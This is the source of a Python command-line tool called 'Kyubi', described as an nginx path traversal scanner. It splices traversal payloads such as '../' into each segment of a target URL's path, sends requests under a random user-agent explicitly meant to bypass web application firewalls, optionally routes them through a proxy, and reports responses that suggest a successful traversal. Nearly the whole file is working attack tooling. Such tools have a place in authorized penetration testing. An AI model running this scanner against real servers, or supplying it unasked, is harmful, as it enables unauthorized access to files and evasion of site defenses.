try:
    from urllib.parse import urlparse
except ImportError:
     from urlparse import urlparse
from colorama import Fore, init
from termcolor import colored
import sys
import argparse as ag
import requests as rq
import pyfiglet
import threading
from fake_useragent import UserAgent

init()
#Generate random user-agent to bypass wafs
USER_AGENT = UserAgent().random
HEADERS = {'User-Agent': USER_AGENT}

argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
argparser.add_argument("url", type=str, help="URL of the target")
argparser.add_argument("-v", help="increase verbosity", action="store_true")
argparser.add_argument("-a", help="append segment in the end", action="store_true")
argparser.add_argument("--proxy", type=str, help="Proxy (e.g., http://127.0.0.1:8080)")

args = argparser.parse_args()

valid = ['200', '301', '302', '403', '400', '401']
payloads = ["../", "../../", "../../../../../../../../../../../"]

# Proxy configuration
PROXIES = {"http": args.proxy, "https": args.proxy} if args.proxy else None

def validate_url(url):
    """Check if the URL is reachable"""
    try:
        response = rq.get(url, headers=HEADERS, proxies=PROXIES, timeout=5, verify=True)
        if response.status_code >= 400:
            print(f"{Fore.YELLOW}Warning: {url} returned status {response.status_code}{Fore.RESET}")
    except rq.RequestException as e:
        print(f"{Fore.RED}Error: Invalid URL - {e}{Fore.RESET}")
        sys.exit(1)

def make_a_request (url):
    resp = 500
    try:
        resp = rq.get(url, headers=HEADERS, proxies=PROXIES, timeout=5, verify=True).status_code
    except Exception as e:
        resp = 500
    return str(resp)

def main():
    parser = urlparse(args.url)
    path = parser.path

    segments = path.split("/")
    segments = segments[1: len(segments)]

    _str = ""
    _marks = ('-' * 80)
    sys.stdout.write("\n{0:50}\t{1}\n{2}\n".format("URL", "Status",_marks))
    for segment in segments:
        _str += "/"+segment
        if(args.a): _x = segment
        else:
            _x = ""
        for payload in payloads:
            _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
            statcode = make_a_request(_url)
            if(args.v):
                sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green') if statcode in valid else colored(statcode, 'red')))
            else:
                if(statcode in valid):
                    sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green')))
    for i in range(0, len(segments)-1):
        for payload in payloads:
            _url = parser.scheme+"://"+parser.netloc+"/" + '/'.join(segments[0:i+1]) + payload + '/'.join(segments[i+1:len(segments)])
            statcode = make_a_request(_url)
            if(args.v):
                sys.stdout.write("{} [{}]\n".format(_url, colored(statcode, 'green') if statcode in valid else colored(statcode, 'red')))
            else:
                if(statcode in valid):
                    sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green')))



if __name__ == '__main__':
    print(pyfiglet.figlet_format("Kyubi"))
    main()
